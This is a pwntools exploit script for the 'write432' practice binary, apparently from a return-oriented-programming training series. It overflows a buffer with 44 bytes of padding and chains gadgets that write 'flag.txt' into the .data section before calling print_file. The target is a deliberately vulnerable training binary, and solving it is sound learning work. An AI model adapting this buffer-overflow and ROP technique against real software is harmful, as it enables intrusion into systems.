#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template write432
from pwn import *
import offset

# Set up pwntools for the correct architecture
exe = context.binary = ELF('write432')
libwrite = ELF('./libwrite432.so')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
break *pwnme+176
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)
# RUNPATH:  b'.'

def get_offset():
    io = start()
    pad = offset.offset(io)
    io.close()
    return pad

pad = get_offset() # 44
# pad = 44

print_file = exe.plt["print_file"] # same as exe.symbols["print_file"]
pwnme = exe.plt["pwnme"]

mov_edi_ebp_ret = 0x08048543
pop_edi_pop_ebp_ret = 0x080485aa

data_section = 0x804a018

io = start()

rop = ROP(exe)
rop.raw(b"\x90" * pad)

rop.raw(pop_edi_pop_ebp_ret)
rop.raw(data_section)
rop.raw("flag")
rop.raw(mov_edi_ebp_ret)

rop.raw(pop_edi_pop_ebp_ret)
rop.raw(data_section+4)
rop.raw(".txt")
rop.raw(mov_edi_ebp_ret)

rop.raw(print_file)
rop.raw(b"\x00\x00\x00\x00")
rop.raw(data_section)

io.sendlineafter(b"> ", rop.chain())

io.interactive()
